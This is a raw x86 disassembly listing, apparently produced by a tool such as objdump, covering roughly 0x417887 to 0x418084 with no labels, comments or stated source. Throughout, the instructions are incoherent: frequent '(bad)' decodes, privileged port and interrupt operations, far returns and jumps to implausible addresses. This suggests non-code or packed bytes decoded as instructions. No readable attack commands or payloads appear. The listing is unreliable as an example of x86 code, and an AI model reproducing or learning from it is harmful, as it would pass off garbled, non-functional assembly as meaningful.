  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
